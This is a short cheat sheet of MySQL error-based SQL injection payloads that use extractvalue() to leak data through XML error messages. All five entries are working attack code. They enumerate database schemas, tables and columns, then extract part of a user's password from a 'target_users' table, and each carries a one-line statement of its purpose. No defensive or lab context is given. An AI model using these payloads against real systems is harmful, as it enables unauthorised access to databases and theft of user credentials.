
# SQL Injection Commands Using `extractvalue()` for Data Exfiltration

These commands use MySQL's `extractvalue()` function to leak data through XML error messages. This technique is useful when other output methods are blocked during SQL injection attacks.

---

## 1. List All Database Schemas

```sql
extractvalue('', concat('>', (
  select group_concat(table_schema) 
  from (
    select table_schema 
    from information_schema.tables 
    group by table_schema
  ) as foo
)))
```

**Purpose**: Retrieve all database names on the server.

---

## 2. List All Tables in the `target` Database

```sql
extractvalue('', concat('>', (
  select group_concat(table_name) 
  from (
    select table_name 
    from information_schema.tables 
    where table_schema='target'
  ) as foo
)))
```

**Purpose**: Enumerate all tables in the `target` database.

---

## 3. Paginated Table Names in `target` (Limit + Offset)

```sql
extractvalue('', concat('>', (
  select group_concat(table_name) 
  from (
    select table_name 
    from information_schema.tables 
    where table_schema='target' 
    limit 2 offset 32
  ) as foo
)))
```

**Purpose**: Retrieve 2 table names starting from the 33rd entry in the `target` database (pagination).

---

## 4. List Columns in the `target_users` Table

```sql
extractvalue('', concat('>', (
  select group_concat(column_name) 
  from (
    select column_name 
    from information_schema.columns 
    where table_schema='target' 
      and table_name='target_users'
  ) as foo
)))
```

**Purpose**: List column names in the `target_users` table.

---

## 5. Extract First 32 Characters of First User Password

```sql
extractvalue('', concat('>', (
  select substring(password, 1, 32) 
  from target_users 
  limit 1 offset 0
)))
```

**Purpose**: Leak the first 32 characters of the password for the first user in the `target_users` table.

---
